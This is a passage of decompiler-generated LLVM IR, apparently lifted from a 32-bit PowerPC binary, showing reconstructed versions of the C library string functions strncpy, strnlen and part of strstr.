  uselistorder i32 %v1_1000f6f8, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000f6a4, { 1, 0, 2 }
  uselistorder i32 %v0_1000f690, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f6e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f698, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000f734 = icmp eq i32 %arg2, 3
  store i1 %v3_1000f734, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f738 = add i32 %arg1, -1
  store i32 %v1_1000f738, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000f7b4, label %dec_label_pc_1000f740

dec_label_pc_1000f740:                            ; preds = %entry
  %v1_1000f740 = udiv i32 %arg2, 4
  store i32 %v1_1000f740, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f748

dec_label_pc_1000f748:                            ; preds = %dec_label_pc_1000f798, %dec_label_pc_1000f740
  %v2_1000f758 = phi i32 [ %v3_1000f790, %dec_label_pc_1000f798 ], [ %v1_1000f738, %dec_label_pc_1000f740 ]
  %v0_1000f748 = load i32, i32* @r4, align 4
  %v1_1000f748 = inttoptr i32 %v0_1000f748 to i8*
  %v2_1000f748 = load i8, i8* %v1_1000f748, align 1
  %v1_1000f74c = add i32 %v0_1000f748, 1
  store i32 %v1_1000f74c, i32* %r10.global-to-local, align 4
  %v1_1000f750 = add i32 %v0_1000f748, 2
  store i32 %v1_1000f750, i32* %r8.global-to-local, align 4
  %v3_1000f754 = icmp eq i8 %v2_1000f748, 0
  store i1 %v3_1000f754, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f758 = add i32 %v2_1000f758, 1
  %v4_1000f758 = inttoptr i32 %v3_1000f758 to i8*
  store i8 %v2_1000f748, i8* %v4_1000f758, align 1
  store i32 %v3_1000f758, i32* %r11.global-to-local, align 4
  %v0_1000f75c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f75c = add i32 %v0_1000f75c, 1
  store i32 %v1_1000f75c, i32* %r9.global-to-local, align 4
  %v0_1000f760 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f760, label %dec_label_pc_1000f7a0, label %dec_label_pc_1000f764

dec_label_pc_1000f764:                            ; preds = %dec_label_pc_1000f748
  %v0_1000f764 = load i32, i32* @r4, align 4
  %v1_1000f764 = add i32 %v0_1000f764, 1
  %v2_1000f764 = inttoptr i32 %v1_1000f764 to i8*
  %v3_1000f764 = load i8, i8* %v2_1000f764, align 1
  %v1_1000f768 = add i32 %v0_1000f75c, 2
  store i32 %v1_1000f768, i32* @r4, align 4
  %v3_1000f76c = icmp eq i8 %v3_1000f764, 0
  store i1 %v3_1000f76c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f770 = add i32 %v2_1000f758, 2
  %v4_1000f770 = inttoptr i32 %v3_1000f770 to i8*
  store i8 %v3_1000f764, i8* %v4_1000f770, align 1
  store i32 %v3_1000f770, i32* %r11.global-to-local, align 4
  %v0_1000f774 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f774, label %dec_label_pc_1000f7a0, label %dec_label_pc_1000f778

dec_label_pc_1000f778:                            ; preds = %dec_label_pc_1000f764
  %v0_1000f778 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f778 = add i32 %v0_1000f778, 1
  %v2_1000f778 = inttoptr i32 %v1_1000f778 to i8*
  %v3_1000f778 = load i8, i8* %v2_1000f778, align 1
  %v3_1000f77c = icmp eq i8 %v3_1000f778, 0
  store i1 %v3_1000f77c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f780 = add i32 %v2_1000f758, 3
  %v4_1000f780 = inttoptr i32 %v3_1000f780 to i8*
  store i8 %v3_1000f778, i8* %v4_1000f780, align 1
  store i32 %v3_1000f780, i32* %r11.global-to-local, align 4
  %v0_1000f784 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f784, label %dec_label_pc_1000f7a0, label %dec_label_pc_1000f788

dec_label_pc_1000f788:                            ; preds = %dec_label_pc_1000f778
  %v0_1000f788 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f788 = add i32 %v0_1000f788, 1
  %v2_1000f788 = inttoptr i32 %v1_1000f788 to i8*
  %v3_1000f788 = load i8, i8* %v2_1000f788, align 1
  %v3_1000f78c = icmp eq i8 %v3_1000f788, 0
  store i1 %v3_1000f78c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f790 = add i32 %v2_1000f758, 4
  %v4_1000f790 = inttoptr i32 %v3_1000f790 to i8*
  store i8 %v3_1000f788, i8* %v4_1000f790, align 1
  store i32 %v3_1000f790, i32* %r11.global-to-local, align 4
  %v0_1000f794 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f794, label %dec_label_pc_1000f7a0, label %dec_label_pc_1000f798

dec_label_pc_1000f798:                            ; preds = %dec_label_pc_1000f788
  %v0_1000f798 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f798 = add i32 %v0_1000f798, -1
  store i32 %v1_1000f798, i32* %ctr.global-to-local, align 4
  %v2_1000f798 = icmp eq i32 %v1_1000f798, 0
  br i1 %v2_1000f798, label %dec_label_pc_1000f7b4, label %dec_label_pc_1000f748

dec_label_pc_1000f7a0:                            ; preds = %dec_label_pc_1000f788, %dec_label_pc_1000f778, %dec_label_pc_1000f764, %dec_label_pc_1000f748
  %v1_1000f7a0 = phi i32 [ %v3_1000f790, %dec_label_pc_1000f788 ], [ %v3_1000f780, %dec_label_pc_1000f778 ], [ %v3_1000f770, %dec_label_pc_1000f764 ], [ %v3_1000f758, %dec_label_pc_1000f748 ]
  %v2_1000f7a011 = sub i32 %arg1, %v1_1000f7a0
  %v2_1000f7a4 = add i32 %v2_1000f7a011, %arg2
  %v1_1000f7a8 = add i32 %v2_1000f7a4, -1
  store i32 %v1_1000f7a8, i32* %r9.global-to-local, align 4
  %v4_1000f7a8 = icmp eq i32 %v1_1000f7a8, 0
  %v0_1000f7ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f7a8, i32 %v0_1000f7ac)
  %v2_1000f7e4.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f7dc

dec_label_pc_1000f7b4:                            ; preds = %dec_label_pc_1000f798, %entry
  %v1_1000f7b4 = urem i32 %arg2, 4
  store i32 %v1_1000f7b4, i32* %r9.global-to-local, align 4
  %v3_1000f7b4 = icmp eq i32 %v1_1000f7b4, 0
  %v0_1000f7b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f7b4, i32 %v0_1000f7b8)
  store i32 %v1_1000f7b4, i32* %ctr.global-to-local, align 4
  %v2_1000f7d0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f7c0

dec_label_pc_1000f7c0:                            ; preds = %dec_label_pc_1000f7d8.dec_label_pc_1000f7c0_crit_edge, %dec_label_pc_1000f7b4
  %v2_1000f7d0 = phi i32 [ %v3_1000f7d0, %dec_label_pc_1000f7d8.dec_label_pc_1000f7c0_crit_edge ], [ %v2_1000f7d0.pre, %dec_label_pc_1000f7b4 ]
  %v0_1000f7c4 = phi i32 [ %v0_1000f7c4.pre, %dec_label_pc_1000f7d8.dec_label_pc_1000f7c0_crit_edge ], [ %v1_1000f7b4, %dec_label_pc_1000f7b4 ]
  %v0_1000f7c0 = load i32, i32* @r4, align 4
  %v1_1000f7c0 = inttoptr i32 %v0_1000f7c0 to i8*
  %v2_1000f7c0 = load i8, i8* %v1_1000f7c0, align 1
  %v1_1000f7c4 = add i32 %v0_1000f7c4, -1
  store i32 %v1_1000f7c4, i32* %r9.global-to-local, align 4
  %v1_1000f7c8 = add i32 %v0_1000f7c0, 1
  store i32 %v1_1000f7c8, i32* @r4, align 4
  %v3_1000f7cc = icmp eq i8 %v2_1000f7c0, 0
  store i1 %v3_1000f7cc, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f7d0 = add i32 %v2_1000f7d0, 1
  %v4_1000f7d0 = inttoptr i32 %v3_1000f7d0 to i8*
  store i8 %v2_1000f7c0, i8* %v4_1000f7d0, align 1
  store i32 %v3_1000f7d0, i32* %r11.global-to-local, align 4
  %v0_1000f7d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7d4 = add i32 %v0_1000f7d4, -1
  store i32 %v1_1000f7d4, i32* %ctr.global-to-local, align 4
  %v2_1000f7d4 = icmp eq i32 %v1_1000f7d4, 0
  br i1 %v2_1000f7d4, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f7d8

dec_label_pc_1000f7d8:                            ; preds = %dec_label_pc_1000f7c0
  %v0_1000f7d8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000f7d8, label %dec_label_pc_1000f7dc, label %dec_label_pc_1000f7d8.dec_label_pc_1000f7c0_crit_edge

dec_label_pc_1000f7d8.dec_label_pc_1000f7c0_crit_edge: ; preds = %dec_label_pc_1000f7d8
  %v0_1000f7c4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f7c0

dec_label_pc_1000f7dc:                            ; preds = %dec_label_pc_1000f7d8, %dec_label_pc_1000f7a0
  %v2_1000f7e4.pre = phi i32 [ %v2_1000f7e4.pre.pre, %dec_label_pc_1000f7a0 ], [ %v3_1000f7d0, %dec_label_pc_1000f7d8 ]
  %v0_1000f7dc = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000f7dc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f7e0

dec_label_pc_1000f7e0:                            ; preds = %dec_label_pc_1000f7e0, %dec_label_pc_1000f7dc
  %v2_1000f7e4 = phi i32 [ %v3_1000f7e4, %dec_label_pc_1000f7e0 ], [ %v2_1000f7e4.pre, %dec_label_pc_1000f7dc ]
  %v3_1000f7e4 = add i32 %v2_1000f7e4, 1
  %v4_1000f7e4 = inttoptr i32 %v3_1000f7e4 to i8*
  store i8 0, i8* %v4_1000f7e4, align 1
  store i32 %v3_1000f7e4, i32* %r11.global-to-local, align 4
  %v0_1000f7e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f7e8 = add i32 %v0_1000f7e8, -1
  store i32 %v1_1000f7e8, i32* %ctr.global-to-local, align 4
  %v2_1000f7e8 = icmp eq i32 %v1_1000f7e8, 0
  br i1 %v2_1000f7e8, label %dec_label_pc_1000f7ec, label %dec_label_pc_1000f7e0

dec_label_pc_1000f7ec:                            ; preds = %dec_label_pc_1000f7c0, %dec_label_pc_1000f7e0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000f7e8, { 1, 0 }
  uselistorder i32 %v3_1000f7e4, { 1, 2, 0 }
  uselistorder i32 %v1_1000f7d4, { 1, 0 }
  uselistorder i32 %v3_1000f7d0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f7b4, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000f798, { 1, 0 }
  uselistorder i32 %v3_1000f790, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f7ec, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f7f0 = load i32, i32* @r4, align 4
  %v3_1000f7f0 = icmp eq i32 %v0_1000f7f0, 0
  %v0_1000f7fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f7f0, i32 %v0_1000f7fc)
  %v1_1000f80c = load i32, i32* @r4, align 4
  %v2_1000f80c = add i32 %v1_1000f80c, %tmp
  %v3_1000f810 = icmp ugt i32 %v2_1000f80c, %tmp
  %v4_1000f810 = icmp eq i32 %v1_1000f80c, 0
  %v2_1000f814 = or i1 %v4_1000f810, %v3_1000f810
  br i1 %v2_1000f814, label %dec_label_pc_1000f81c, label %dec_label_pc_1000f818

dec_label_pc_1000f804:                            ; preds = %dec_label_pc_1000f884
  br label %dec_label_pc_1000f8c8

dec_label_pc_1000f818:                            ; preds = %entry
  br label %dec_label_pc_1000f81c

dec_label_pc_1000f81c:                            ; preds = %entry, %dec_label_pc_1000f818
  %v0_1000f8cc = phi i32 [ %v2_1000f80c, %entry ], [ -1, %dec_label_pc_1000f818 ]
  %v1_1000f84c6 = urem i32 %tmp, 4
  %v3_1000f84c8 = icmp eq i32 %v1_1000f84c6, 0
  br i1 %v3_1000f84c8, label %dec_label_pc_1000f854, label %dec_label_pc_1000f824

dec_label_pc_1000f824:                            ; preds = %dec_label_pc_1000f81c, %dec_label_pc_1000f848
  %v0_1000f83c = phi i32 [ %v1_1000f848, %dec_label_pc_1000f848 ], [ %tmp, %dec_label_pc_1000f81c ]
  %v1_1000f824 = inttoptr i32 %v0_1000f83c to i8*
  %v2_1000f824 = load i8, i8* %v1_1000f824, align 1
  %v3_1000f828 = icmp eq i8 %v2_1000f824, 0
  br i1 %v3_1000f828, label %dec_label_pc_1000f830, label %dec_label_pc_1000f848

dec_label_pc_1000f830:                            ; preds = %dec_label_pc_1000f824
  %v3_1000f830 = icmp ugt i32 %v0_1000f8cc, %v0_1000f83c
  %v0_1000f83c.v0_1000f8cc = select i1 %v3_1000f830, i32 %v0_1000f83c, i32 %v0_1000f8cc
  %v2_1000f840 = sub i32 %v0_1000f83c.v0_1000f8cc, %tmp
  ret i32 %v2_1000f840

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f824
  %v1_1000f848 = add i32 %v0_1000f83c, 1
  %v1_1000f84c = urem i32 %v1_1000f848, 4
  %v3_1000f84c = icmp eq i32 %v1_1000f84c, 0
  br i1 %v3_1000f84c, label %dec_label_pc_1000f854, label %dec_label_pc_1000f824

dec_label_pc_1000f854:                            ; preds = %dec_label_pc_1000f848, %dec_label_pc_1000f81c
  %v0_1000f858 = phi i32 [ %tmp, %dec_label_pc_1000f81c ], [ %v1_1000f848, %dec_label_pc_1000f848 ]
  %v2_1000f8c03 = icmp ult i32 %v0_1000f858, %v0_1000f8cc
  br i1 %v2_1000f8c03, label %dec_label_pc_1000f864, label %dec_label_pc_1000f8c8

dec_label_pc_1000f864:                            ; preds = %dec_label_pc_1000f854, %dec_label_pc_1000f8bc
  %v0_1000f804 = phi i32 [ %v1_1000f868, %dec_label_pc_1000f8bc ], [ %v0_1000f858, %dec_label_pc_1000f854 ]
  %v1_1000f864 = inttoptr i32 %v0_1000f804 to i32*
  %v2_1000f864 = load i32, i32* %v1_1000f864, align 4
  %v1_1000f868 = add i32 %v0_1000f804, 4
  %v1_1000f874 = add i32 %v2_1000f864, -16843009
  %v2_1000f878 = and i32 %v1_1000f874, -2139062144
  %v5_1000f878 = icmp eq i32 %v2_1000f878, 0
  %v1_1000f87c = add i32 %v0_1000f804, 1
  br i1 %v5_1000f878, label %dec_label_pc_1000f8bc, label %dec_label_pc_1000f884

dec_label_pc_1000f884:                            ; preds = %dec_label_pc_1000f864
  %v2_1000f884 = inttoptr i32 %v0_1000f804 to i8*
  %v3_1000f884 = load i8, i8* %v2_1000f884, align 1
  %v3_1000f888 = icmp eq i8 %v3_1000f884, 0
  br i1 %v3_1000f888, label %dec_label_pc_1000f804, label %dec_label_pc_1000f890

dec_label_pc_1000f890:                            ; preds = %dec_label_pc_1000f884
  %v2_1000f890 = inttoptr i32 %v1_1000f87c to i8*
  %v3_1000f890 = load i8, i8* %v2_1000f890, align 1
  %v3_1000f894 = icmp eq i8 %v3_1000f890, 0
  br i1 %v3_1000f894, label %dec_label_pc_1000f8c8, label %dec_label_pc_1000f89c

dec_label_pc_1000f89c:                            ; preds = %dec_label_pc_1000f890
  %v1_1000f89c = add i32 %v0_1000f804, 2
  %v2_1000f89c = inttoptr i32 %v1_1000f89c to i8*
  %v3_1000f89c = load i8, i8* %v2_1000f89c, align 1
  %v3_1000f8a4 = icmp eq i8 %v3_1000f89c, 0
  br i1 %v3_1000f8a4, label %dec_label_pc_1000f8c8, label %dec_label_pc_1000f8ac

dec_label_pc_1000f8ac:                            ; preds = %dec_label_pc_1000f89c
  %v1_1000f8ac = add i32 %v0_1000f804, 3
  %v2_1000f8ac = inttoptr i32 %v1_1000f8ac to i8*
  %v3_1000f8ac = load i8, i8* %v2_1000f8ac, align 1
  %v3_1000f8b4 = icmp eq i8 %v3_1000f8ac, 0
  br i1 %v3_1000f8b4, label %dec_label_pc_1000f8c8, label %dec_label_pc_1000f8bc

dec_label_pc_1000f8bc:                            ; preds = %dec_label_pc_1000f8ac, %dec_label_pc_1000f864
  %v2_1000f8c0 = icmp ult i32 %v1_1000f868, %v0_1000f8cc
  br i1 %v2_1000f8c0, label %dec_label_pc_1000f864, label %dec_label_pc_1000f8c8

dec_label_pc_1000f8c8:                            ; preds = %dec_label_pc_1000f8bc, %dec_label_pc_1000f890, %dec_label_pc_1000f89c, %dec_label_pc_1000f8ac, %dec_label_pc_1000f854, %dec_label_pc_1000f804
  %v0_1000f8d4 = phi i32 [ %v0_1000f804, %dec_label_pc_1000f804 ], [ %v0_1000f858, %dec_label_pc_1000f854 ], [ %v1_1000f8ac, %dec_label_pc_1000f8ac ], [ %v1_1000f89c, %dec_label_pc_1000f89c ], [ %v1_1000f87c, %dec_label_pc_1000f890 ], [ %v0_1000f8cc, %dec_label_pc_1000f8bc ]
  %v3_1000f8c8 = icmp ugt i32 %v0_1000f8cc, %v0_1000f8d4
  %v0_1000f8d4.v0_1000f8cc = select i1 %v3_1000f8c8, i32 %v0_1000f8d4, i32 %v0_1000f8cc
  %v2_1000f8d8 = sub i32 %v0_1000f8d4.v0_1000f8cc, %tmp
  ret i32 %v2_1000f8d8

; uselistorder directives
  uselistorder i32 %v1_1000f868, { 1, 0 }
  uselistorder i32 %v0_1000f804, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v0_1000f858, { 1, 0, 2 }
  uselistorder i32 %v1_1000f848, { 1, 0, 2 }
  uselistorder i32 %v0_1000f83c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000f8cc, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000f80c, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000f8c8, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000f864, { 1, 0 }
  uselistorder label %dec_label_pc_1000f824, { 1, 0 }
  uselistorder label %dec_label_pc_1000f81c, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000f8e0 = load i8, i8* %arg2, align 1
  %v4_1000f8e0 = zext i8 %v3_1000f8e0 to i32
  store i32 %v4_1000f8e0, i32* %r6.global-to-local, align 4
  %v3_1000f8e4 = icmp eq i8 %v3_1000f8e0, 0
  %v0_1000f8e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f8e4, i32 %v0_1000f8e8)
  %v1_1000f8ec = add i32 %arg1, -1
  store i32 %v1_1000f8ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f8f0

dec_label_pc_1000f8f0:                            ; preds = %dec_label_pc_1000f900, %entry
  %v0_1000f8f0 = phi i32 [ %v1_1000f8f0, %dec_label_pc_1000f900 ], [ %v1_1000f8ec, %entry ]
  %v1_1000f8f0 = add i32 %v0_1000f8f0, 1
  %v2_1000f8f0 = inttoptr i32 %v1_1000f8f0 to i8*
  %v3_1000f8f0 = load i8, i8* %v2_1000f8f0, align 1
  store i32 %v1_1000f8f0, i32* %r3.global-to-local, align 4
  %v3_1000f8f4 = icmp eq i8 %v3_1000f8f0, 0
  br i1 %v3_1000f8f4, label %dec_label_pc_1000f9cc, label %dec_label_pc_1000f900

dec_label_pc_1000f900:                            ; preds = %dec_label_pc_1000f8f0
  %v4_1000f8f8 = icmp eq i8 %v3_1000f8f0, %v3_1000f8e0
  br i1 %v4_1000f8f8, label %dec_label_pc_1000f904, label %dec_label_pc_1000f8f0

dec_label_pc_1000f904:                            ; preds = %dec_label_pc_1000f900
  %v2_1000f904 = add i32 %tmp, 1
  %v3_1000f904 = inttoptr i32 %v2_1000f904 to i8*
  %v4_1000f904 = load i8, i8* %v3_1000f904, align 1
  %v5_1000f904 = zext i8 %v4_1000f904 to i32
  store i32 %v5_1000f904, i32* %r5.global-to-local, align 4
  store i32 %v2_1000f904, i32* %r4.global-to-local, align 4
  %v3_1000f90c = icmp eq i8 %v4_1000f904, 0
  %v0_1000f910 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f90c, i32 %v0_1000f910)
  %v0_1000f914.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f958

dec_label_pc_1000f920:                            ; preds = %dec_label_pc_1000f9c0
  %v3_1000f920 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000f920 = zext i8 %v3_1000f920 to i32
  store i32 %v1_1000f914, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f948.preheader

dec_label_pc_1000f948.preheader:                  ; preds = %dec_label_pc_1000f920, %dec_label_pc_1000f958
  %v0_1000f94817 = phi i32 [ %v4_1000f920, %dec_label_pc_1000f920 ], [ %storemerge4, %dec_label_pc_1000f958 ]
  %v1_1000f948.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000f94825 = icmp eq i32 %v0_1000f94817, %v1_1000f948.pre
  %v3_1000f94c27 = icmp eq i32 %v0_1000f94817, 0
  br i1 %v4_1000f94825, label %dec_label_pc_1000f958, label %dec_label_pc_1000f92c

dec_label_pc_1000f92c:                            ; preds = %dec_label_pc_1000f948.preheader, %dec_label_pc_1000f944
  %v3_1000f94c29 = phi i1 [ %v3_1000f94c, %dec_label_pc_1000f944 ], [ %v3_1000f94c27, %dec_label_pc_1000f948.preheader ]
  %v0_1000f93028 = phi i32 [ %v1_1000f944, %dec_label_pc_1000f944 ], [ %v1_1000f914, %dec_label_pc_1000f948.preheader ]
  br i1 %v3_1000f94c29, label %dec_label_pc_1000f9cc, label %dec_label_pc_1000f930

dec_label_pc_1000f930:                            ; preds = %dec_label_pc_1000f92c
  %v1_1000f930 = add i32 %v0_1000f93028, 1
  %v2_1000f930 = inttoptr i32 %v1_1000f930 to i8*
  %v3_1000f930 = load i8, i8* %v2_1000f930, align 1
  %v4_1000f930 = zext i8 %v3_1000f930 to i32
  store i32 %v1_1000f930, i32* %r11.global-to-local, align 4
  %v4_1000f934 = icmp eq i32 %v4_1000f930, %v1_1000f948.pre
  br i1 %v4_1000f934, label %dec_label_pc_1000f958, label %dec_label_pc_1000f940

dec_label_pc_1000f940:                            ; preds = %dec_label_pc_1000f930
  %v3_1000f938 = icmp eq i8 %v3_1000f930, 0
  br i1 %v3_1000f938, label %dec_label_pc_1000f9cc, label %dec_label_pc_1000f944

dec_label_pc_1000f944:                            ; preds = %dec_label_pc_1000f940
  %v1_1000f944 = add i32 %v0_1000f93028, 2
  %v2_1000f944 = inttoptr i32 %v1_1000f944 to i8*
  %v3_1000f944 = load i8, i8* %v2_1000f944, align 1
  %v4_1000f944 = zext i8 %v3_1000f944 to i32
  store i32 %v1_1000f944, i32* %r11.global-to-local, align 4
  %v4_1000f948 = icmp eq i32 %v4_1000f944, %v1_1000f948.pre
  %v3_1000f94c = icmp eq i8 %v3_1000f944, 0
  br i1 %v4_1000f948, label %dec_label_pc_1000f958, label %dec_label_pc_1000f92c

dec_label_pc_1000f958:                            ; preds = %dec_label_pc_1000f948.preheader, %dec_label_pc_1000f944, %dec_label_pc_1000f930, %dec_label_pc_1000f904
  %v0_1000f914.sink = phi i32 [ %v0_1000f914.sink.pre, %dec_label_pc_1000f904 ], [ %v1_1000f914, %dec_label_pc_1000f948.preheader ], [ %v1_1000f944, %dec_label_pc_1000f944 ], [ %v1_1000f930, %dec_label_pc_1000f930 ]
  %v1_1000f914 = add i32 %v0_1000f914.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1000f914 to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1000f914, i32* %r11.global-to-local, align 4
  %v1_1000f958 = load i32, i32* %r5.global-to-local, align 4
  %v4_1000f958 = icmp eq i32 %storemerge4, %v1_1000f958
  br i1 %v4_1000f958, label %dec_label_pc_1000f960, label %dec_label_pc_1000f948.preheader

dec_label_pc_1000f960:                            ; preds = %dec_label_pc_1000f958
  %v1_1000f960 = add i32 %v0_1000f914.sink, 2
  %v2_1000f960 = inttoptr i32 %v1_1000f960 to i8*
  %v3_1000f960 = load i8, i8* %v2_1000f960, align 1
  %v4_1000f960 = zext i8 %v3_1000f960 to i32
  store i32 %v4_1000f960, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f914.sink, i32* %r3.global-to-local, align 4
  %v0_1000f968 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f968 = add i32 %v0_1000f968, 1
  %v2_1000f968 = inttoptr i32 %v1_1000f968 to i8*
  %v3_1000f968 = load i8, i8* %v2_1000f968, align 1
  %v4_1000f968 = zext i8 %v3_1000f968 to i32
  store i32 %v1_1000f968, i32* %r8.global-to-local, align 4
  store i32 %v1_1000f960, i32* %r11.global-to-local, align 4
  %v4_1000f974 = icmp eq i8 %v3_1000f960, %v3_1000f968
  br i1 %v4_1000f974, label %dec_label_pc_1000f97c, label %dec_label_pc_1000f9c0

dec_label_pc_1000f97c:                            ; preds = %dec_label_pc_1000f960, %dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge
  %v0_1000f984 = phi i32 [ %v0_1000f984.pre, %dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge ], [ %v1_1000f968, %dec_label_pc_1000f960 ]
  %v0_1000f980 = phi i32 [ %v0_1000f980.pre, %dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge ], [ %v1_1000f960, %dec_label_pc_1000f960 ]
  %v0_1000f97c = phi i32 [ %v4_1000f9ac, %dec_label_pc_1000f9a8.dec_label_pc_1000f97c_crit_edge ], [ %v4_1000f960, %dec_label_pc_1000f960 ]
  %v3_1000f97c = icmp eq i32 %v0_1000f97c, 0
  %v1_1000f980 = add i32 %v0_1000f980, 1
  store i32 %v1_1000f980, i32* %r7.global-to-local, align 4
  %v1_1000f984 = add i32 %v0_1000f984, 1
  store i32 %v1_1000f984, i32* %r10.global-to-local, align 4
  %v0_1000f988 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f97c, i32 %v0_1000f988)
  %v0_1000f98c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f98c = add i32 %v0_1000f98c, 1
  %v2_1000f98c = inttoptr i32 %v1_1000f98c to i8*
  %v3_1000f98c = load i8, i8* %v2_1000f98c, align 1
  %v4_1000f98c = zext i8 %v3_1000f98c to i32
  %v0_1000f990 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f990 = add i32 %v0_1000f990, 1
  store i32 %v1_1000f990, i32* %r8.global-to-local, align 4
  %v0_1000f994 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f994 = add i32 %v0_1000f994, 1
  %v2_1000f994 = inttoptr i32 %v1_1000f994 to i8*
  %v3_1000f994 = load i8, i8* %v2_1000f994, align 1
  %v0_1000f998 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f998 = add i32 %v0_1000f998, 1
  store i32 %v1_1000f998, i32* %r11.global-to-local, align 4
  %v4_1000f9a0 = icmp eq i8 %v3_1000f994, %v3_1000f98c
  br i1 %v4_1000f9a0, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f9c0

dec_label_pc_1000f9a8:                            ; preds = %dec_label_pc_1000f97c
  %v3_1000f99c = icmp eq i8 %v3_1000f98c, 0
  %v0_1000f9a8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000f99c, i32 %v0_1000f9a8)
  %v0_1000f9ac = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f9ac = add i32 %v0_1000f9ac, 1
  %v2_1000f9ac = inttoptr i32 %v1_1000f9ac to i8*
  %v3_1000f9ac = load i8, i8* %v2_1000f9ac, align 1
  %v4_1000f9ac = zext i8 %v3_1000f9ac to i32
  %v0_1000f9b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000f9b0 = add i32 %v0_1000f9b0, 1
  %v2_1000f9b0 = inttoptr i32 %v1_1000f9b0 to i8*
  %v3_1000f9b0 = load i8, i8* %v2_1000f9b0, align 1
